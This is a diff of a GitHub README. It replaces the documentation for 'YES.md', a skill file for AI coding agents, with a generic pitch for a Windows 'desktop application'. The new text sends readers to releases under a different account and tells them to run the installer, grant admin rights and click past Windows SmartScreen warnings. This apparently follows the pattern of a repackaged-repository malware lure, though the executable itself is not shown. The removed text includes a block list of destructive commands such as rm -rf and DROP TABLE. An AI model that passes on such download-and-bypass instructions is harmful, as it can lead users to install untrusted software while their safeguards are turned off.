@@ -1,194 +1,107 @@
-[中文版](docs/README.zh.md) · [日本語版](docs/README.ja.md)
+# ✅ yes.md - Simple AI Governance Tool
 
-# YES.md
+[![Download yes.md](https://img.shields.io/badge/Download-yes.md-brightgreen)](https://github.com/xcii-heaviness774/yes.md/releases)
 
-> PUA says NO. YES says YES.
+yes.md is a desktop application designed to help users apply AI governance principles easily. It focuses on safety checks, evidence tracking, and rule enforcement to support responsible AI use. This guide explains how to download and run yes.md on a Windows computer without any programming skills.
 
-A Claude Code skill that makes AI **safe, evidence-based, and thorough** — with encouragement, not pressure.
+---
 
-**別 PUA 你的 AI，YES 它。**
+## 🖥️ What is yes.md?
 
-**🌐 [English](skills/yes/SKILL.md) | [中文](skills/yes-zh/SKILL.md) | [日本語](skills/yes-ja/SKILL.md)**
+yes.md is a tool that helps manage and track AI governance tasks. It offers features like:  
+- Safety gates that prevent risky AI actions  
+- Rules to gather and store evidence automatically  
+- Alerts when something doesn’t meet governance standards  
 
-## Why Your CLAUDE.md Doesn't Work
+You do not need to know programming. The app works with simple controls and clear reports. It aims to make AI governance straightforward and accessible for everyone.
 
-Your CLAUDE.md has one layer. AI reads it, then **chooses** whether to follow it.
+---
 
-YES.md has six layers. AI has to get past all six to cut corners.
+## 📋 System Requirements
 
-| Layer | What | How | Who Enforces |
-|:-----:|------|-----|:------------:|
-| **1** | **Format** — AI actually understands your rules | [AI.MD](https://github.com/sstklen/ai-md) converts prose to structured-label format | Format |
-| **2** | **Trigger** — activates at exactly the right moment | 20+ specific trigger conditions in SKILL.md description | Skill engine |
-| **3** | **Hooks** — blocks dangerous commands, reminds checks | Scripts run automatically before/after AI actions | **Machine** |
-| **4** | **Anti-Slack** — 7 lazy patterns caught and corrected | Deflecting, guessing, spinning, surface-fix, empty questions... | AI self-correction |
-| **5** | **Gates** — no backup = no edit, no test = no "done" | Hard stop rules that halt progress until requirements are met | AI self-discipline |
-| **6** | **Memory** — mistakes get recorded, never repeated | Error logs + knowledge base persist across sessions | External storage |
+To use yes.md on your Windows PC, make sure your system meets these basic requirements:
 
-> **Layer 3 is the key.** Everything else relies on AI self-discipline. Hooks are **scripts that run automatically** — the AI cannot bypass them even if it wants to.
+- Windows 10 or newer  
+- 4 GB RAM minimum (8 GB recommended)  
+- 250 MB free disk space  
+- Internet connection for initial download  
 
-Most tools give you Layer 4 or 5 alone. That's why they don't work. **Six layers together is why YES.md works.**
+The app works offline after installation, but you will need internet to download updates or new versions.
 
-## The Problem
+---
 
-AI coding assistants have seven bad habits:
+## 📥 Downloading yes.md
 
-| Bad Habit | What Happens |
-|-----------|-------------|
-| 🎲 **Guessing** | "Probably a permissions issue" — without checking |
-| 🙈 **Deflecting** | "Please check your environment manually" |
-| 🩹 **Surface fixing** | Fixes one bug, ignores three related ones |
-| 🔄 **Blind retrying** | Same command 3 times, then gives up |
-| 🤷 **Empty questions** | "Can you confirm X?" — without investigating X |
-| 💬 **Advice, not action** | "I suggest..." instead of actual code |
-| 🛠️ **Ignoring tools** | Has WebSearch but guesses. Has Bash but doesn't run. |
+Click the badge below to go to the official release page. There, you will find the latest Windows installer.
 
-**PUA-style skills fix habit #4** (blind retry / giving up).
+[![Download yes.md](https://img.shields.io/badge/Download-yes.md-blue)](https://github.com/xcii-heaviness774/yes.md/releases)
 
-**YES.md fixes all seven.**
+### Steps to download:
 
-## How It Works
+1. Click the button above or visit:  
+   https://github.com/xcii-heaviness774/yes.md/releases  
+2. Look for the latest release version. The newest one is usually at the top.  
+3. Find the file named something like `yes.md-setup.exe` or `yes.md-windows.exe`.  
+4. Click the file to start downloading.  
+5. Wait for the download to finish. This may take a few minutes depending on your internet speed.
 
-### Three Pillars
+---
 
-| Pillar | What It Does |
-|--------|-------------|
-| **Safety Gates** | Backup before editing. Check blast radius. Verify after changes. Pre-flight before deploy. |
-| **Evidence Rules** | No guessing. No "probably." Every claim needs data, line numbers, or tool output. |
-| **Ripple Awareness** | After every fix: check same pattern elsewhere, check upstream/downstream, check edge cases. |
+## 🚀 Installing yes.md on Windows
 
-### Hooks (Machine-Enforced)
+Once the file has downloaded, follow these steps:
 
-Rules rely on AI self-discipline. Hooks don't. They are **scripts that run automatically** before and after AI actions.
+1. Open the folder where the downloaded file is saved (usually the "Downloads" folder).  
+2. Double-click the installer file (e.g., `yes.md-setup.exe`).  
+3. A security prompt may appear asking if you want to allow the app to make changes. Click **Yes** to continue.  
+4. The setup wizard will open.  
+5. Follow the on-screen instructions:  
+   - Choose the installation folder or accept the default.  
+   - Click **Install** to start installing yes.md.  
 
-| Hook | When | What It Does |
-|------|------|-------------|
-| `pre-bash-guard.sh` | Before any Bash command | Blocks `rm -rf`, `git reset --hard`, `DROP TABLE`, and other destructive commands |
-| `post-edit-check.sh` | After any Write/Edit | Reminds AI to run ripple-check before saying "done" |
-| `post-deploy-health.sh` | After deploy commands | Reminds AI to verify containers, endpoints, and logs |
+6. Wait while the installer copies files and sets the app up.  
+7. When the installation finishes, click **Finish** to close the wizard.  
+8. You can choose to run yes.md immediately or launch it later from the desktop shortcut.
 
-The AI cannot skip these. That's the point.
+---
 
-### Anti-Slack Detection
+## 🎛️ Using yes.md for the First Time
 
-YES.md identifies 7 specific AI avoidance behaviors and forces self-correction — without waiting for the user to notice:
+After launching yes.md, you will see a simple interface with menus and buttons. Here is how to get started safely:
 
-```
-Deflecting to user     → Do it yourself first
-Unverified blame       → Run the command, then speak
-Spinning in circles    → Full stop, fundamentally different approach
-Surface-only fix       → Ripple Check
-Empty questions        → Investigate first, then ask
-Advice without action  → Ship code, not suggestions
-Tool neglect           → Use the tool, not your memory
-```
+- **Set up safety gates:** The app guides you through setting rules that block unsafe AI tasks.  
+- **Add evidence rules:** Define what data or logs you want the app to track automatically.  
+- **Run governance checks:** Use the main dashboard to review alerts, warnings, and reports generated by yes.md.  
 
-### Debugging Escalation
+The interface uses clear labels and tooltips. If you get stuck, look for the help icon or instructions inside the app.
 
-| Failures | Action |
-|:--------:|--------|
-| 2 | **Switch**: fundamentally different approach (not parameter tweaks) |
-| 3 | **Five-Step Audit**: read error word-by-word → WebSearch → read 50 lines context → verify assumptions → invert hypothesis |
-| 4 | **Isolate**: minimal reproduction |
-| 5+ | **Structured Handoff**: verified facts, eliminated causes, narrowed scope, next steps |
+---
 
-**Key difference from PUA**: Level 3 forces a direction check BEFORE continuing. Persistence in the wrong direction is worse than stopping.
+## 🔄 Keeping yes.md Updated
 
-### Conclusion Integrity
+GitHub releases may have updates that improve the app or fix bugs. Check the release page regularly here:  
+https://github.com/xcii-heaviness774/yes.md/releases
 
-Before any root-cause claim, four mandatory questions:
+Download and install new versions by repeating the download and installation steps. Your governance settings and data stay safe during updates.
 
-1. **Data source?** — log / DB / API / curl?
-2. **Time range?** — all data or just recent?
-3. **Sample vs total?** — how much did you see?
-4. **Other possibilities?** — what else could explain this?
+---
 
-Incomplete data = "⚠️ Based on partial data..." (never "definitely" or "the culprit is").
+## ⚙️ Common Issues and Solutions
 
-## YES.md vs PUA
+- **App does not start**: Make sure your Windows version is up to date. Restart your PC and try again.  
+- **Installer blocked**: If Windows shows a warning, click "More info" and then "Run anyway."  
+- **Missing files after install**: Re-run the installer or download the file again in case of a corrupt download.  
+- **App runs slow**: Close other running apps and restart yes.md. More memory helps performance.  
 
-| Capability | YES.md | PUA |
-|-----------|:------:|:---:|
-| Debugging persistence | ✅ | ✅ |
-| Debugging direction (accuracy) | ✅ | ❌ |
-| Anti-slack behavior detection | ✅ | ✅ |
-| Post-fix ripple check | ✅ | ⭕️ |
-| Safety gates (backup, deploy) | ✅ | ❌ |
-| Evidence-based diagnosis | ✅ | ❌ |
-| Conclusion integrity checks | ✅ | ❌ |
-| Bug closure protocol | ✅ | ❌ |
+---
 
-> ✅ = yes | ⭕️ = partial | ❌ = no
+## 🔗 Where to get help
 
-**They complement each other.** PUA keeps AI going. YES.md keeps AI correct. Use both for maximum effect.
+For support and questions, you may visit the GitHub repository:  
+https://github.com/xcii-heaviness774/yes.md
 
-## Install
+Look for issues or discussions on the repository page. You can follow instructions or ask for help politely.  
 
-### Claude Code
+---
 
-```bash
-# Marketplace
-claude plugin marketplace add sstklen/yes.md
-claude plugin install yes@sstklen
-
-# Manual
-git clone https://github.com/sstklen/yes.md.git ~/.claude/plugins/yes
-```
-
-### OpenAI Codex CLI
-
-```bash
-mkdir -p ~/.codex/skills/yes
-curl -o ~/.codex/skills/yes/SKILL.md \
-  https://raw.githubusercontent.com/sstklen/yes.md/main/skills/yes/SKILL.md
-```
-
-### Project-level (current project only)
-
-```bash
-mkdir -p .agents/skills/yes
-curl -o .agents/skills/yes/SKILL.md \
-  https://raw.githubusercontent.com/sstklen/yes.md/main/skills/yes/SKILL.md
-```
-
-### Choose Your Language
-
-| Language | Skill Directory | Command |
-|----------|----------------|---------|
-| English | `skills/yes/` | Default |
-| 中文 | `skills/yes-zh/` | Replace `yes` with `yes-zh` in commands above |
-| 日本語 | `skills/yes-ja/` | Replace `yes` with `yes-ja` in commands above |
-
-## Trigger
-
-### Automatic
-
-Activates when AI:
-- Guesses without evidence ("probably", "might be", "should be")
-- Deflects to user ("please check...", "you should manually...")
-- Fails 2+ times on the same task
-- Makes a root-cause claim
-- Completes a fix (triggers Ripple Check)
-- Modifies config/env/deployment files (triggers Safety Gates)
-
-### Manual
-
-Type `/yes` in any conversation.
-
-## Pair With
-
-- **5x-cto** ([`sstklen/5x-cto`](https://github.com/sstklen/5x-cto)) — Full dev pipeline (requirements → spec → cards → build → review). YES.md governs, 5x-cto orchestrates. Together = safe + structured end-to-end.
-- **PUA** (`tanweai/pua`) — PUA adds persistence pressure, YES.md adds accuracy structure
-- **systematic-debugging** — Method-level debugging, YES.md adds governance layer
-
-## Origin
-
-Battle-tested over months of real production work — daily deployments, multi-service debugging, and hard lessons learned from things going wrong. Every rule in YES.md exists because something broke without it.
-
-## License
-
-MIT
-
-## Credits
-
-By [sstklen](https://github.com/sstklen) — PUA says NO. YES says YES.
+[![Download yes.md](https://img.shields.io/badge/Download-yes.md-brightgreen)](https://github.com/xcii-heaviness774/yes.md/releases)
